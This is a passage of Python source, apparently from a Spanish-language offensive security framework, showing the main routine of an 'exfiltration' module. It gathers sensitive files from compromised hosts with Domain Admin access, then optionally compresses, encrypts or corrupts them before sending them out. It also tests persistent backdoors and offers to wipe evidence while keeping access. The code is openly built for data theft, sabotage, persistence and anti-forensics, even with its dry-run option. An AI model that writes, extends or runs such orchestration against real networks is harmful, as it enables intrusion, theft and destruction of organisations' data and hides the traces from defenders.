                'encryption_enabled': False,
                'corruption_enabled': False,
                'fast_exfiltration': True
            }
        
        self.logging_system.log_info(f"Configuración de exfiltración:", "EXFILTRATION")
        self.logging_system.log_info(f"  • Compresión: {'✅ Habilitada' if delicate_options.get('compression_enabled') else '❌ Deshabilitada'}", "EXFILTRATION")
        self.logging_system.log_info(f"  • Encriptación: {'✅ Habilitada' if delicate_options.get('encryption_enabled') else '❌ Deshabilitada'}", "EXFILTRATION")
        self.logging_system.log_info(f"  • Corrupción: {'✅ Habilitada' if delicate_options.get('corruption_enabled') else '❌ Deshabilitada'}", "EXFILTRATION")
        self.logging_system.log_info(f"  • Exfiltración rápida: {'✅ Habilitada' if delicate_options.get('fast_exfiltration') else '❌ Deshabilitada'}", "EXFILTRATION")
        
        try:
            if management_mode:
                self.logging_system.log_info("MODO GESTIÓN: Trabajando con exploits persistentes existentes", "EXFILTRATION")
                
                # Cargar exploits existentes desde logs
                existing_exploits = self.load_existing_exploits(log_file)
                
                if existing_exploits:
                    # Gestionar exploits persistentes
                    management_actions = self.manage_persistent_exploits(existing_exploits)
                    
                    # Probar conectividad de backdoors
                    connectivity_results = self.test_backdoor_connectivity(existing_exploits)
                    
                    # Opciones de limpieza selectiva
                    self.logging_system.log_info("Opciones de limpieza disponibles:", "EXFILTRATION")
                    print(f"{Colors.YELLOW}1. Limpiar solo evidencia (mantener accesos){Colors.END}")
                    print(f"{Colors.ORANGE}2. Limpiar backdoors completamente{Colors.END}")
                    print(f"{Colors.BLUE}3. No limpiar nada{Colors.END}")
                    
                    try:
                        cleanup_choice = input(f"{Colors.YELLOW}Seleccione opción de limpieza (1-3): {Colors.END}")
                        
                        cleanup_results = []
                        if cleanup_choice == '1':
                            cleanup_results = self.cleanup_evidence_only(existing_exploits)
                        elif cleanup_choice == '2':
                            cleanup_results = self.cleanup_exploits(existing_exploits)
                        else:
                            self.logging_system.log_info("Limpieza cancelada por el usuario", "EXFILTRATION")
                            
                    except KeyboardInterrupt:
                        self.logging_system.log_info("Limpieza cancelada por el usuario", "EXFILTRATION")
                        cleanup_results = []
                    
                    self.results['persistent_exploits'] = existing_exploits
                    self.results['management_actions'] = management_actions
                    self.results['connectivity_results'] = connectivity_results
                    self.results['cleanup_results'] = cleanup_results
                else:
                    self.logging_system.log_warning("No se encontraron exploits persistentes en los logs", "EXFILTRATION")
                    self.logging_system.log_info("Asegúrese de que el archivo de log contenga información de exploits", "EXFILTRATION")
                
            else:
                if delicate_options.get('fast_exfiltration', True):
                    self.logger.info("⚡ MODO RÁPIDO: Ejecutando exfiltración rápida de archivos pequeños")
                else:
                    self.logger.info("🆕 MODO COMPLETO: Ejecutando exfiltración completa")
                
                # Sistemas comprometidos de ejemplo (en implementación real vendrían de fases anteriores)
                compromised_systems = [
                    {'host': '192.168.1.100', 'privilege_level': 'Domain Admin'},
                    {'host': '192.168.1.101', 'privilege_level': 'Administrator'}
                ]
                
                self.logger.info(f"🎯 Sistemas comprometidos detectados: {len(compromised_systems)}")
                for system in compromised_systems:
                    self.logger.info(f"  📊 {system['host']} - {system['privilege_level']}")
                
                # 1. Recopilar datos sensibles
                if delicate_options.get('fast_exfiltration', True):
                    # Exfiltración rápida: solo archivos pequeños
                    collected_data = self.collect_small_files_only(compromised_systems)
                else:
                    # Exfiltración completa: todos los archivos
                    collected_data = self.collect_sensitive_data(compromised_systems)
                
                if not collected_data:
                    self.logger.warning("⚠️ No se pudieron recopilar datos - posible falta de acceso o vulnerabilidades")
                    self.logger.info("💡 Verifique que los sistemas estén realmente comprometidos")
                    return self.results
                
                # 2. Comprimir datos (solo si está habilitado)
                compression_results = []
                if delicate_options.get('compression_enabled', False):
                    compression_results = self.compress_data(collected_data)
                    
                    if not compression_results:
                        self.logging_system.log_warning("Compresión cancelada o falló", "EXFILTRATION")
                        data_files = []
                    else:
                        data_files = [result['zip_file'] for result in compression_results]
                else:
                    # Sin compresión, usar archivos originales
                    data_files = [data['file_path'] for data in collected_data]
                
                # 2.5. Encriptar datos (solo si está habilitado)
                encryption_results = []
                if data_files and delicate_options.get('encryption_enabled', False):
                    encryption_results = self.encrypt_data(data_files)
                    if encryption_results:
                        data_files = [result['encrypted_file'] for result in encryption_results]
                
                # 2.7. Corromper datos (solo si está habilitado)
                corruption_results = []
                if data_files and delicate_options.get('corruption_enabled', False):
                    corruption_results = self.corrupt_data(data_files)
                    if corruption_results:
                        data_files = [result['corrupted_file'] for result in corruption_results]
                
                # 3. Exfiltrar datos
                exfiltration_results = self.exfiltrate_data(data_files)
                
                # 4. Probar conectividad de backdoors si existen
                existing_exploits = self.load_existing_exploits(log_file)
                if existing_exploits:
                    self.logger.info("🔍 Detectados exploits persistentes - probando conectividad...")
                    connectivity_results = self.test_backdoor_connectivity(existing_exploits)
                    self.results['connectivity_results'] = connectivity_results
            
            # Guardar evidencia
            self.logging_system.save_json_evidence(
                'exfiltration_results.json',
                self.results,
                'data'
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            # Actualizar contadores para resumen
            self.results['execution_time'] = duration
            self.results['files_exfiltrated'] = len(self.results.get('exfiltrated_data', []))
            self.results['exploits_managed'] = len(self.results.get('persistent_exploits', []))
            
            # Resumen final
            self.logging_system.log_info("=" * 60, "EXFILTRATION")
            self.logging_system.log_success("MÓDULO DE EXFILTRACIÓN COMPLETADO", "EXFILTRATION")
            
            # Generar y mostrar resumen de fase
            phase_summary = self.logging_system.generate_phase_summary("EXFILTRATION", self.results)
            print(f"\n{phase_summary}\n")
            
            # Mostrar resumen de permisos
            if self.results.get('permissions_granted') or self.results.get('permissions_denied'):
                print(f"\n{Colors.CYAN}📋 RESUMEN DE PERMISOS:{Colors.END}")
                print(f"{Colors.CYAN}{'='*40}{Colors.END}")
                
                if self.results.get('permissions_granted'):
                    print(f"{Colors.GREEN}✅ Permisos otorgados:{Colors.END}")
                    for permission in self.results['permissions_granted']:
                        print(f"  • {permission}")
                
                if self.results.get('permissions_denied'):
                    print(f"{Colors.RED}❌ Permisos denegados:{Colors.END}")
                    for permission in self.results['permissions_denied']:
                        print(f"  • {permission}")
                
                print(f"{Colors.CYAN}{'='*40}{Colors.END}")
            
            if self.dry_run:
                self.logging_system.log_info("[DRY-RUN] Esta fue una simulación - no se realizaron cambios reales", "EXFILTRATION")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error crítico en módulo de exfiltración: {e}")
            self.logger.error("💡 Verifique la configuración y conectividad de red")
            return self.results
